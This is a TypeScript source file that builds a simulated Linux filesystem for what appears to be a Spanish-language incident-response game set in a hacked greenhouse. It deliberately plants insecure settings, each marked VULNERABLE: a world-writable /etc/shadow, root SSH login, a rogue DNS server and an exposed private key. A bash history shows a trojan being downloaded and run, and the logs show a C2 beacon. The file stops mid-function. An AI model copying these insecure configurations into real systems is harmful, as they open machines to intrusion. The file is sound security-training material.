import type { FSNode } from './types';
import { computeSha256 } from './cryptoUtils';

export const CONTENT_CALIBRACION_V1 = `# ====================================================================
# CALIBRACIÓN OFICIAL SISTEMA DE RIEGO Y NUTRIENTES - ESTACIÓN BOTÁNICA N.º 4
# PROTOCOLO BIOLÓGICO: BIO-NUTRIENT-V1.0
# ESTADO: ÓPTIMO - VALIDADO POR EL CUIDADOR JEFE
# ====================================================================
PH_TARGET=6.4
HUMIDITY_TARGET=68.0
NITROGEN_PPM=180
PHOSPHORUS_PPM=65
POTASSIUM_PPM=210
CYCLE_INTERVAL_MIN=120
UV_EXPOSURE_HOURS=8
SENSOR_TOLERANCE_PCT=2.5
IRRIGATION_MODE=AEROPONIC_PULSE
AUTOPILOT_FAILSAFE=ENABLED
`;

export const CONTENT_CALIBRACION_V2 = `# ====================================================================
# [ADVERTENCIA] ARCHIVO DE CALIBRACIÓN ALTERADO
# ANOMALÍA DETECTADA: PARÁMETROS TÓXICOS PARA ESPECÍMENES VEGETALES
# ====================================================================
PH_TARGET=3.1
HUMIDITY_TARGET=99.0
NITROGEN_PPM=850
PHOSPHORUS_PPM=420
POTASSIUM_PPM=900
CYCLE_INTERVAL_MIN=15
UV_EXPOSURE_HOURS=24
SENSOR_TOLERANCE_PCT=0.0
IRRIGATION_MODE=FLOOD_ACID_CONTINUOUS
AUTOPILOT_FAILSAFE=OVERRIDDEN_BY_C2
`;

export const HASH_CALIBRACION_V1 = computeSha256(CONTENT_CALIBRACION_V1);
export const HASH_CALIBRACION_V2 = computeSha256(CONTENT_CALIBRACION_V2);

export function createInitialFileSystem(): Record<string, FSNode> {
  const fs: Record<string, FSNode> = {
    // -------------------------------------------------------------
    // Root and FHS Standard Directory Hierarchy
    // -------------------------------------------------------------
    '/': {
      type: 'dir',
      perms: '755',
      owner: 'root',
      group: 'root',
      size: 4096,
      modified: '2026-10-14 00:00:00',
      magic: 'directory',
    },
    '/bin': {
      type: 'dir',
      perms: '755',
      owner: 'root',
      group: 'root',
      size: 4096,
      modified: '2026-10-14 00:00:00',
      magic: 'directory',
    },
    '/boot': {
      type: 'dir',
      perms: '755',
      owner: 'root',
      group: 'root',
      size: 4096,
      modified: '2026-10-14 00:00:00',
      magic: 'directory',
    },
    '/dev': {
      type: 'dir',
      perms: '755',
      owner: 'root',
      group: 'root',
      size: 4096,
      modified: '2026-10-14 00:00:00',
      magic: 'directory',
    },
    '/etc': {
      type: 'dir',
      perms: '755',
      owner: 'root',
      group: 'root',
      size: 4096,
      modified: '2026-10-14 00:00:00',
      magic: 'directory',
    },
    '/etc/ssh': {
      type: 'dir',
      perms: '755',
      owner: 'root',
      group: 'root',
      size: 4096,
      modified: '2026-10-14 00:00:00',
      magic: 'directory',
    },
    '/home': {
      type: 'dir',
      perms: '755',
      owner: 'root',
      group: 'root',
      size: 4096,
      modified: '2026-10-14 00:00:00',
      magic: 'directory',
    },
    '/home/operario': {
      type: 'dir',
      perms: '750',
      owner: 'operario',
      group: 'operario',
      size: 4096,
      modified: '2026-10-16 08:00:00',
      magic: 'directory',
    },
    '/home/cuidador': {
      type: 'dir',
      perms: '755',
      owner: 'cuidador',
      group: 'cuidador',
      size: 4096,
      modified: '2026-10-15 22:15:00',
      magic: 'directory',
    },
    '/home/cuidador/.ssh': {
      type: 'dir',
      perms: '700',
      owner: 'cuidador',
      group: 'cuidador',
      size: 4096,
      modified: '2026-10-15 22:10:00',
      magic: 'directory',
    },
    '/home/cuidador/backups': {
      type: 'dir',
      perms: '755',
      owner: 'cuidador',
      group: 'cuidador',
      size: 4096,
      modified: '2026-10-15 21:00:00',
      magic: 'directory',
    },
    '/lib': {
      type: 'dir',
      perms: '755',
      owner: 'root',
      group: 'root',
      size: 4096,
      modified: '2026-10-14 00:00:00',
      magic: 'directory',
    },
    '/lib64': {
      type: 'dir',
      perms: '755',
      owner: 'root',
      group: 'root',
      size: 4096,
      modified: '2026-10-14 00:00:00',
      magic: 'directory',
    },
    '/media': {
      type: 'dir',
      perms: '755',
      owner: 'root',
      group: 'root',
      size: 4096,
      modified: '2026-10-14 00:00:00',
      magic: 'directory',
    },
    '/mnt': {
      type: 'dir',
      perms: '755',
      owner: 'root',
      group: 'root',
      size: 4096,
      modified: '2026-10-14 00:00:00',
      magic: 'directory',
    },
    '/opt': {
      type: 'dir',
      perms: '755',
      owner: 'root',
      group: 'root',
      size: 4096,
      modified: '2026-10-14 00:00:00',
      magic: 'directory',
    },
    '/opt/sensores': {
      type: 'dir',
      perms: '755',
      owner: 'cuidador',
      group: 'cuidador',
      size: 4096,
      modified: '2026-10-15 23:45:00',
      magic: 'directory',
    },
    '/opt/formulas': {
      type: 'dir',
      perms: '755',
      owner: 'cuidador',
      group: 'cuidador',
      size: 4096,
      modified: '2026-10-15 21:30:00',
      magic: 'directory',
    },
    '/proc': {
      type: 'dir',
      perms: '555',
      owner: 'root',
      group: 'root',
      size: 0,
      modified: '2026-10-16 00:00:00',
      magic: 'directory',
    },
    '/root': {
      type: 'dir',
      perms: '700',
      owner: 'root',
      group: 'root',
      size: 4096,
      modified: '2026-10-14 00:00:00',
      magic: 'directory',
    },
    '/run': {
      type: 'dir',
      perms: '755',
      owner: 'root',
      group: 'root',
      size: 4096,
      modified: '2026-10-16 00:00:00',
      magic: 'directory',
    },
    '/sbin': {
      type: 'dir',
      perms: '755',
      owner: 'root',
      group: 'root',
      size: 4096,
      modified: '2026-10-14 00:00:00',
      magic: 'directory',
    },
    '/srv': {
      type: 'dir',
      perms: '755',
      owner: 'root',
      group: 'root',
      size: 4096,
      modified: '2026-10-14 00:00:00',
      magic: 'directory',
    },
    '/sys': {
      type: 'dir',
      perms: '555',
      owner: 'root',
      group: 'root',
      size: 0,
      modified: '2026-10-16 00:00:00',
      magic: 'directory',
    },
    '/tmp': {
      type: 'dir',
      perms: '1777',
      owner: 'root',
      group: 'root',
      size: 4096,
      modified: '2026-10-16 03:15:00',
      magic: 'directory',
    },
    '/usr': {
      type: 'dir',
      perms: '755',
      owner: 'root',
      group: 'root',
      size: 4096,
      modified: '2026-10-14 00:00:00',
      magic: 'directory',
    },
    '/usr/bin': {
      type: 'dir',
      perms: '755',
      owner: 'root',
      group: 'root',
      size: 4096,
      modified: '2026-10-14 00:00:00',
      magic: 'directory',
    },
    '/var': {
      type: 'dir',
      perms: '755',
      owner: 'root',
      group: 'root',
      size: 4096,
      modified: '2026-10-14 00:00:00',
      magic: 'directory',
    },
    '/var/log': {
      type: 'dir',
      perms: '755',
      owner: 'root',
      group: 'root',
      size: 4096,
      modified: '2026-10-16 00:00:00',
      magic: 'directory',
    },
    '/var/www': {
      type: 'dir',
      perms: '755',
      owner: 'www-data',
      group: 'www-data',
      size: 4096,
      modified: '2026-10-15 00:00:00',
      magic: 'directory',
    },
    '/var/www/invernadero': {
      type: 'dir',
      perms: '755',
      owner: 'www-data',
      group: 'www-data',
      size: 4096,
      modified: '2026-10-15 00:00:00',
      magic: 'directory',
    },

    // -------------------------------------------------------------
    // Core Configuration Files in /etc
    // -------------------------------------------------------------
    '/etc/passwd': {
      type: 'file',
      perms: '644',
      owner: 'root',
      group: 'root',
      size: 1420,
      modified: '2026-10-15 10:00:00',
      magic: 'ASCII text',
      content: `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
messagebus:x:105:111::/nonexistent:/usr/sbin/nologin
_apt:x:106:65534::/nonexistent:/usr/sbin/nologin
ntp:x:112:118::/nonexistent:/usr/sbin/nologin
cuidador:x:1000:1000:Cuidador Principal Estacion 4,,,:/home/cuidador:/bin/bash
operario:x:1001:1001:Operario de Seguridad Asignado,,,:/home/operario:/bin/bash
`,
    },

    // VULNERABLE: /etc/shadow has perms 777! Breaks confidentiality!
    '/etc/shadow': {
      type: 'file',
      perms: '777',
      owner: 'root',
      group: 'shadow',
      size: 980,
      modified: '2026-10-15 10:00:00',
      magic: 'ASCII text',
      content: `root:$6$vE4d9J$XG1hL/9b...k32.VzL9a1N0qZ7:19645:0:99999:7:::
daemon:*:19645:0:99999:7:::
bin:*:19645:0:99999:7:::
sys:*:19645:0:99999:7:::
sync:*:19645:0:99999:7:::
games:*:19645:0:99999:7:::
man:*:19645:0:99999:7:::
lp:*:19645:0:99999:7:::
mail:*:19645:0:99999:7:::
news:*:19645:0:99999:7:::
uucp:*:19645:0:99999:7:::
proxy:*:19645:0:99999:7:::
www-data:*:19645:0:99999:7:::
backup:*:19645:0:99999:7:::
list:*:19645:0:99999:7:::
irc:*:19645:0:99999:7:::
gnats:*:19645:0:99999:7:::
nobody:*:19645:0:99999:7:::
systemd-network:*:19645:0:99999:7:::
systemd-resolve:*:19645:0:99999:7:::
syslog:*:19645:0:99999:7:::
messagebus:*:19645:0:99999:7:::
_apt:*:19645:0:99999:7:::
ntp:*:19645:0:99999:7:::
cuidador:$6$botanica4$sE4rchP4ssW0rdH4sh8823JsklmA:19645:0:99999:7:::
operario:$6$domoSeguro$K9xL2pQ8mN5vT1wR4yU7jE0aC:19645:0:99999:7:::
`,
    },

    '/etc/group': {
      type: 'file',
      perms: '644',
      owner: 'root',
      group: 'root',
      size: 850,
      modified: '2026-10-15 10:00:00',
      magic: 'ASCII text',
      content: `root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:syslog,cuidador,operario
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:cuidador
fax:x:21:
voice:x:22:
cdrom:x:24:
floppy:x:25:
tape:x:26:
sudo:x:27:operario,cuidador
audio:x:29:
dip:x:30:
www-data:x:33:
backup:x:34:
operator:x:37:
src:x:40:
shadow:x:42:
utmp:x:43:
video:x:44:
sasl:x:45:
plugdev:x:46:
staff:x:50:
games:x:60:
users:x:100:
nogroup:x:65534:
cuidador:x:1000:
operario:x:1001:
`,
    },

    '/etc/hosts': {
      type: 'file',
      perms: '644',
      owner: 'root',
      group: 'root',
      size: 420,
      modified: '2026-10-15 10:00:00',
      magic: 'ASCII text',
      content: `127.0.0.1       localhost
127.0.1.1       invernadero-central.local invernadero-central
10.0.2.15       invernadero-central
10.0.1.1        dns-invernadero.local dns-interno
10.0.1.20       panel.invernadero.local
10.0.1.50       sensor-clima-domo.local
10.0.1.51       bomba-nutrientes.local

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
`,
    },

    // VULNERABLE: Untrusted DNS nameserver!
    '/etc/resolv.conf': {
      type: 'file',
      perms: '644',
      owner: 'root',
      group: 'root',
      size: 130,
      modified: '2026-10-16 02:45:00',
      magic: 'ASCII text',
      content: `# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
nameserver 10.66.6.6
search invernadero.local
`,
    },

    '/etc/hostname': {
      type: 'file',
      perms: '644',
      owner: 'root',
      group: 'root',
      size: 20,
      modified: '2026-10-14 00:00:00',
      magic: 'ASCII text',
      content: `invernadero-central\n`,
    },

    // VULNERABLE: PermitRootLogin yes!
    '/etc/ssh/sshd_config': {
      type: 'file',
      perms: '644',
      owner: 'root',
      group: 'root',
      size: 1200,
      modified: '2026-10-15 11:00:00',
      magic: 'ASCII text',
      content: `# OpenSSH Daemon Configuration File for invernadero-central
Port 22
AddressFamily any
ListenAddress 0.0.0.0

# Security Hardening Directives
PermitRootLogin yes
PasswordAuthentication yes
PubkeyAuthentication yes
AuthorizedKeysFile .ssh/authorized_keys

# Cryptography & Ciphers
KexAlgorithms curve25519-sha256,diffie-hellman-group14-sha256
Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com
MACs hmac-sha2-512-etm@openssh.com

Subsystem sftp /usr/lib/openssh/sftp-server
UsePAM yes
`,
    },

    // -------------------------------------------------------------
    // Virtual Files (/proc)
    // -------------------------------------------------------------
    '/proc/cpuinfo': {
      type: 'file',
      perms: '444',
      owner: 'root',
      group: 'root',
      size: 1024,
      modified: '2026-10-16 00:00:00',
      magic: 'ASCII text',
      content: `processor       : 0
vendor_id       : BioQuantumBotanics
cpu family      : 16
model           : 4
model name      : Procesador Bio-Cuántico Modelo Helecho v2.4 (Foliar Architecture)
stepping        : 2
cpu MHz         : 3200.000
cache size      : 8192 KB
flags           : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 bio_chlorophyll opt_photosynthesis
bogomips        : 6400.00
clflush size    : 64
cache_alignment : 64
address sizes   : 40 bits physical, 48 bits virtual

processor       : 1
vendor_id       : BioQuantumBotanics
cpu family      : 16
model           : 4
model name      : Procesador Bio-Cuántico Modelo Helecho v2.4 (Foliar Architecture)
stepping        : 2
cpu MHz         : 3200.000
cache size      : 8192 KB
flags           : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 bio_chlorophyll opt_photosynthesis
bogomips        : 6400.00
clflush size    : 64
cache_alignment : 64
address sizes   : 40 bits physical, 48 bits virtual
`,
    },
    '/proc/version': {
      type: 'file',
      perms: '444',
      owner: 'root',
      group: 'root',
      size: 150,
      modified: '2026-10-16 00:00:00',
      magic: 'ASCII text',
      content: `Linux version 5.15.0-invernadero (gcc version 11.2.0, GNU/Linux) #4 SMP PREEMPT Fri Oct 10 14:20:00 UTC 2026\n`,
    },

    // -------------------------------------------------------------
    // Log Files in /var/log
    // -------------------------------------------------------------
    '/var/log/auth.log': {
      type: 'file',
      perms: '640',
      owner: 'syslog',
      group: 'adm',
      size: 4200,
      modified: '2026-10-16 04:30:00',
      magic: 'ASCII text',
      content: `Oct 16 02:11:04 invernadero-central in.telnetd[842]: connect from 198.51.100.44
Oct 16 02:11:08 invernadero-central login[842]: FAILED LOGIN (1) on '/dev/pts/0' FOR 'root' AUTH_FAILED from 198.51.100.44
Oct 16 02:11:12 invernadero-central login[842]: FAILED LOGIN (2) on '/dev/pts/0' FOR 'admin' AUTH_FAILED from 198.51.100.44
Oct 16 02:11:16 invernadero-central login[842]: FAILED LOGIN (3) on '/dev/pts/0' FOR 'cuidador' AUTH_FAILED from 198.51.100.44
Oct 16 02:11:22 invernadero-central login[842]: Accepted login for user 'cuidador' from 198.51.100.44 on /dev/pts/0
Oct 16 02:12:01 invernadero-central sudo: cuidador : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/chmod 777 /etc/shadow
Oct 16 02:13:40 invernadero-central sshd[888]: Failed password for invalid user bot from 203.0.113.88 port 49152 ssh2
Oct 16 02:13:45 invernadero-central sshd[888]: Failed password for invalid user test from 203.0.113.88 port 49154 ssh2
Oct 16 02:13:50 invernadero-central sshd[888]: Connection closed by authenticating user 203.0.113.88 port 49154 [preauth]
Oct 16 03:00:01 invernadero-central CRON[2100]: (cuidador) CMD (/bin/bash /opt/sensores/riego_nocturno.sh)
Oct 16 03:14:10 invernadero-central systemd[1]: Starting Botanical Telemetry Collection...
Oct 16 04:00:01 invernadero-central sudo: operario : TTY=pts/1 ; PWD=/home/operario ; USER=root ; COMMAND=/bin/ls
`,
    },
    '/var/log/syslog': {
      type: 'file',
      perms: '640',
      owner: 'syslog',
      group: 'adm',
      size: 5120,
      modified: '2026-10-16 04:30:00',
      magic: 'ASCII text',
      content: `Oct 16 01:00:00 invernadero-central systemd[1]: Time has been changed
Oct 16 01:00:01 invernadero-central ntpd[999]: ntpd exiting on signal 15: ntp.service stopped by operator
Oct 16 01:05:00 invernadero-central kernel: [    0.000000] Warning: Clock drift detected without active NTP sync.
Oct 16 02:00:00 invernadero-central sensors[1150]: [TELEMETRÍA] Sensor humedad Bancal 1: 68.0% - Lámparas UV: ESTABLE
Oct 16 02:15:30 invernadero-central kernel: [ 4512.981023] audit: type=1400 audit(1729044930.120:42): apparmor="STATUS" operation="profile_replace"
Oct 16 02:30:00 invernadero-central nginx[1024]: 10.0.1.50 - - [16/Oct/2026:02:30:00 +0000] "GET /telemetria.json HTTP/1.1" 200 142 "-" "curl/7.88.1"
Oct 16 03:00:00 invernadero-central CRON[2108]: (cuidador) CMD (/bin/bash /opt/sensores/riego_nocturno.sh)
Oct 16 03:00:05 invernadero-central riego_nocturno[2108]: [RIEGO NOCTURNO] Pulsos de niebla activados para helechos arbóreos. Duración: 180s.
Oct 16 03:15:00 invernadero-central kernel: [ 7210.124589] polilla_emisora[4412]: segfault at 0 ip 00007f8b90124sp 00007ffe48102
Oct 16 03:15:02 invernadero-central polilla_emisora[4412]: [C2] Conexión establecida con baliza exterior 198.51.100.44:4444 (CPU al 68.4%)
Oct 16 04:00:00 invernadero-central sensors[1150]: [ALERTA] Temperatura en domo subiendo: 28.6 °C. Ventiladores acelerados al 100%.
`,
    },

    // -------------------------------------------------------------
    // Web Server in /var/www/invernadero
    // -------------------------------------------------------------
    '/var/www/invernadero/index.html': {
      type: 'file',
      perms: '644',
      owner: 'www-data',
      group: 'www-data',
      size: 2450,
      modified: '2026-10-15 12:00:00',
      magic: 'HTML document, ASCII text',
      content: `<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Domo Central — Estación Botánica Automatizada N.º 4</title>
  <style>
    body { font-family: monospace; background: #0c140f; color: #a3e635; padding: 2rem; }
    h1 { color: #4ade80; border-bottom: 2px solid #22c55e; padding-bottom: 8px; }
    .card { background: rgba(22,101,52,0.15); border: 1px solid #16a34a; border-radius: 8px; padding: 1.5rem; margin-top: 1rem; }
    .status-ok { color: #86efac; font-weight: bold; }
  </style>
</head>
<body>
  <h1>🌱 DOMO CENTRAL: TELEMETRÍA BOTÁNICA EN VIVO</h1>
  <p>Estación Botánica y Observatorio de Señales Atmosféricas — Nodo invernadero-central</p>
  <div class="card">
    <h2>Estado de Especímenes Biológicos</h2>
    <ul>
      <li>Orquídea Fantasma de Señal (Dendrophylax lindenii var. radio): <span class="status-ok">MONITOREADA</span></li>
      <li>Helecho Arbóreo Milenario (Cyathea cooperi antiqua): <span class="status-ok">MONITOREADO</span></li>
      <li>Bóveda Criogénica de Germoplasma: <span class="status-ok">SELLADA (-18 °C)</span></li>
    </ul>
  </div>
</body>
</html>
`,
    },

    // -------------------------------------------------------------
    // Home Directories: /home/operario (The User!)
    // -------------------------------------------------------------
    '/home/operario/.bashrc': {
      type: 'file',
      perms: '644',
      owner: 'operario',
      group: 'operario',
      size: 1100,
      modified: '2026-10-16 08:00:00',
      magic: 'ASCII text',
      content: `# ~/.bashrc: executed by bash(1) for non-login shells.
export PS1="\\[\\e[1;32m\\]\\u@\\h\\[\\e[0m\\]:\\[\\e[1;34m\\]\\w\\[\\e[0m\\]\\$ "
alias ll='ls -lah --color=auto'
alias la='ls -A --color=auto'
alias l='ls -CF --color=auto'
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\\s*[0-9]\\+\\s*//;s/[;&|]\\s*alert$//'\'')"'
`,
    },
    '/home/operario/.profile': {
      type: 'file',
      perms: '644',
      owner: 'operario',
      group: 'operario',
      size: 450,
      modified: '2026-10-16 08:00:00',
      magic: 'ASCII text',
      content: `# ~/.profile: executed by Bourne-compatible login shells.
if [ "$BASH" ]; then
  if [ -f "$HOME/.bashrc" ]; then
    . "$HOME/.bashrc"
  fi
fi
PATH="$HOME/bin:$HOME/.local/bin:$PATH"
`,
    },

    // -------------------------------------------------------------
    // Home Directories: /home/cuidador (The Disappeared Caretaker)
    // -------------------------------------------------------------
    '/home/cuidador/.bashrc': {
      type: 'file',
      perms: '644',
      owner: 'cuidador',
      group: 'cuidador',
      size: 980,
      modified: '2026-10-14 12:00:00',
      magic: 'ASCII text',
      content: `export PS1="\\u@\\h:\\w\\$ "\nalias ll='ls -la'\n`,
    },
    '/home/cuidador/.bash_history': {
      type: 'file',
      perms: '600',
      owner: 'cuidador',
      group: 'cuidador',
      size: 1540,
      modified: '2026-10-16 02:15:00',
      magic: 'ASCII text',
      content: `ls -la
cd /opt/sensores
cat calibracion_riego.conf
systemctl status ntp.service
systemctl stop ntp.service
# El reloj se desfasaba y los logs molestaban... lo apagué para que no me interrumpa.
chmod 777 /etc/shadow
# Necesitaba editar contraseñas rápido sin sudo y olvidé revertirlo...
chmod 777 ~/.ssh/id_ed25519
# SSH se quejaba de permisos, así que le di permisos a todo... qué mala idea.
nano /etc/ssh/sshd_config
# Dejé PermitRootLogin yes para poder entrar directo desde la antena exterior.
systemctl restart ssh
cd /tmp
wget http://sensores-botanicos-raros.org/catalogo_orquideas.pdf
file catalogo_orquideas.pdf
./catalogo_orquideas.pdf
# Espera... la pantalla parpadeó y los ventiladores empezaron a sonar como un avión.
ps aux | grep polilla
kill -9 ??? no recuerdo el PID
cd /home/cuidador/backups
ls -la
sha256sum *
cp calibracion_v2.conf /opt/sensores/calibracion_riego.conf
# ¿Por qué las hojas de los helechos se están poniendo negras y ácidas?
# Algo no está bien. El hash no coincide con mi cuaderno.
# Tengo que esconderme en el subsuelo antes de que regresen.
`,
    },

    // Caretaker's Hidden Note with the legitimate SHA-256 hash!
    '/home/cuidador/.notas_cuidador.txt': {
      type: 'file',
      perms: '644',
      owner: 'cuidador',
      group: 'cuidador',
      size: 1820,
      modified: '2026-10-16 02:20:00',
      magic: 'ASCII text',
      sha256: computeSha256('notas_cuidador_text_content'),
      content: `========================================================================
BITÁCORA CONFIDENCIAL DEL CUIDADOR - ESTACIÓN BOTÁNICA N.º 4
========================================================================

Si estás leyendo esto, lograste conectarte como operario después de que
mi señal se perdiera en el domo. No te asustes, pero presta atención:

1. LA CALIBRACIÓN DE NUTRIENTES:
   Los atacantes reemplazaron la configuración de riego por una fórmula tóxica
   (v2) con pH ácido de 3.1 que está matando las orquídeas fantasma y los helechos.
   En mi carpeta de respaldos (/home/cuidador/backups/ y /opt/formulas/) dejé copias.
   La ÚNICA copia íntegra y legítima tiene el siguiente hash SHA-256 oficial:

   HASH SHA-256 OFICIAL:
   ${HASH_CALIBRACION_V1}

   Calcula los hashes con "sha256sum" y copia la versión legítima sobre:
   /opt/sensores/calibracion_riego.conf
   (o usa "cp" para restaurarla).

2. EL TROYANO EN /tmp:
   Descargué lo que creía que era un catálogo de orquídeas en /tmp/catalogo_orquideas.pdf.
   Al usar "file /tmp/catalogo_orquideas.pdf" descubrí con horror que es un
   binario ejecutable ELF camuflado. ¡Elimínalo con "rm"!

3. EL PROCESO INTRUSO (POLILLA EMISORA):
   Se ejecuta bajo el usuario "www-data" conectado a una IP externa (198.51.100.44).
   Usa "ps aux", encuentra su PID y mátalo con "kill -15 <PID>" para que los
   ventiladores vuelvan a la calma. OJO: No toques el script riego_nocturno.sh,
   es mi script benigno para los helechos (el EDR lo marca como falso positivo).

4. CIERRA LOS CANDADOS:
   Cometí el error de dejar /etc/shadow en 777 y mi llave privada ~/.ssh/id_ed25519
   en 777. Corrígelos a 600 con "chmod 600".
   Desactiva Telnet (puerto 23) y restaura el servicio NTP con "systemctl start ntp".

Cuida de los helechos. La señal no puede apagarse.
-- El Cuidador
`,
    },

    // VULNERABLE: Caretaker SSH Private Key with perms 777!
    '/home/cuidador/.ssh/id_ed25519': {
      type: 'file',
      perms: '777',
      owner: 'cuidador',
      group: 'cuidador',
      size: 464,
      modified: '2026-10-15 22:10:00',
      magic: 'OpenSSH private key',
      content: `-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBA1vK0r+vH7h2Y7vK4jL8nK3lPqW1sK3xL9vO0j5m8QwAAAJgAwvQDAM
L0AwAAAAtzc2gtZWQyNTUxOQAAACBA1vK0r+vH7h2Y7vK4jL8nK3lPqW1sK3xL9vO0j5
m8QwAAAEC6m4l7j3vL0vQ9n8kL2m1p0qR8vK3lL4m7n0p2qL5m3n8r1lK4n6m9vL0vQ9
n8kL2m1p0qR8vK3lL4m7n0p2qL4AAAAWY3VpZGFkb3JAaW52ZXJuYWRlcm8=
-----END OPENSSH PRIVATE KEY-----
`,
    },
    '/home/cuidador/.ssh/id_ed25519.pub': {
      type: 'file',
      perms: '644',
      owner: 'cuidador',
      group: 'cuidador',
      size: 110,
      modified: '2026-10-15 22:10:00',
      magic: 'OpenSSH public key',
      content: `ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEDW8rSv68fuHZju8riMvycreU+pbWwrfEv287SPmbxD cuidador@invernadero\n`,
    },

    // Backups in /home/cuidador/backups/
    '/home/cuidador/backups/calibracion_v1.conf': {
      type: 'file',
      perms: '644',
      owner: 'cuidador',
      group: 'cuidador',
      size: CONTENT_CALIBRACION_V1.length,
      modified: '2026-10-15 14:00:00',
      magic: 'ASCII text',
      sha256: HASH_CALIBRACION_V1,
      content: CONTENT_CALIBRACION_V1,
    },
    '/home/cuidador/backups/calibracion_v2.conf': {
      type: 'file',
      perms: '644',
      owner: 'cuidador',
      group: 'cuidador',
      size: CONTENT_CALIBRACION_V2.length,
      modified: '2026-10-16 02:00:00',
      magic: 'ASCII text',
      sha256: HASH_CALIBRACION_V2,
      content: CONTENT_CALIBRACION_V2,
    },
    '/home/cuidador/backups/calibracion_backup.dat': {
      type: 'file',
      perms: '644',
      owner: 'cuidador',
      group: 'cuidador',
      size: CONTENT_CALIBRACION_V1.length,
      modified: '2026-10-14 18:00:00',
      magic: 'ASCII text',
      sha256: HASH_CALIBRACION_V1,
      content: CONTENT_CALIBRACION_V1,
    },

    // Backups in /opt/formulas/
    '/opt/formulas/formula_v1.dat': {
      type: 'file',
      perms: '644',
      owner: 'cuidador',
      group: 'cuidador',
      size: CONTENT_CALIBRACION_V1.length,
      modified: '2026-10-15 14:00:00',
      magic: 'ASCII text',
      sha256: HASH_CALIBRACION_V1,
      content: CONTENT_CALIBRACION_V1,
    },
    '/opt/formulas/formula_v2.dat': {
      type: 'file',
      perms: '644',
      owner: 'cuidador',
      group: 'cuidador',
      size: CONTENT_CALIBRACION_V2.length,
      modified: '2026-10-16 02:00:00',
      magic: 'ASCII text',
      sha256: HASH_CALIBRACION_V2,
      content: CONTENT_CALIBRACION_V2,
    },
    '/opt/formulas/formula_backup.dat': {
      type: 'file',
      perms: '644',
      owner: 'cuidador',
      group: 'cuidador',
      size: CONTENT_CALIBRACION_V1.length,
      modified: '2026-10-14 18:00:00',
      magic: 'ASCII text',
      sha256: HASH_CALIBRACION_V1,
      content: CONTENT_CALIBRACION_V1,
    },

    // -------------------------------------------------------------
    // Active Sensors and Scripts in /opt/sensores
    // -------------------------------------------------------------
    // VULNERABLE: Currently loaded calibration is v2 (toxic flood)!
    '/opt/sensores/calibracion_riego.conf': {
      type: 'file',
      perms: '644',
      owner: 'cuidador',
      group: 'cuidador',
      size: CONTENT_CALIBRACION_V2.length,
      modified: '2026-10-16 02:15:00',
      magic: 'ASCII text',
      sha256: HASH_CALIBRACION_V2,
      content: CONTENT_CALIBRACION_V2,
    },
    // Benign Watering Script (EDR False Positive)
    '/opt/sensores/riego_nocturno.sh': {
      type: 'file',
      perms: '755',
      owner: 'cuidador',
      group: 'cuidador',
      size: 920,
      modified: '2026-10-14 20:00:00',
      magic: 'Bourne-Again shell script, ASCII text executable',
      content: `#!/bin/bash
# ====================================================================
# SCRIPT DE AUTOMATIZACIÓN BOTÁNICA: RIEGO NOCTURNO DE HELECHOS
# PROPÓSITO: Mantener micro-aspersión controlada a las 03:00 AM
# ESPECIE OBJETIVO: Cyathea cooperi antiqua (Helecho Arbóreo Milenario)
# ====================================================================

VALVULA_SECTOR_3="/dev/valvula_helechos"
LOG_FILE="/var/log/syslog"

echo "[$(date)] Iniciando ciclo programado de riego nocturno..." >> $LOG_FILE

# Dispersión hidropónica suave durante 180 segundos
if [ -c "$VALVULA_SECTOR_3" ]; then
    echo "PULSO_ON" > "$VALVULA_SECTOR_3"
    sleep 3
    echo "PULSO_OFF" > "$VALVULA_SECTOR_3"
fi

echo "[$(date)] Ciclo de nebulización finalizado con éxito." >> $LOG_FILE
exit 0
`,
    },
    '/opt/sensores/monitor_espectro.py': {
      type: 'file',
      perms: '755',
      owner: 'cuidador',
      group: 'cuidador',
      size: 1450,
      modified: '2026-10-14 20:30:00',
      magic: 'Python script, ASCII text executable',
      content: `#!/usr/bin/env python3
"""
Monitor Espectral de Frecuencias Fotosintéticas y Bioluminiscencia
Estación Botánica Automatizada N.º 4 - invernadero-central
"""
import time
import sys

def leer_espectrometro():
    return {
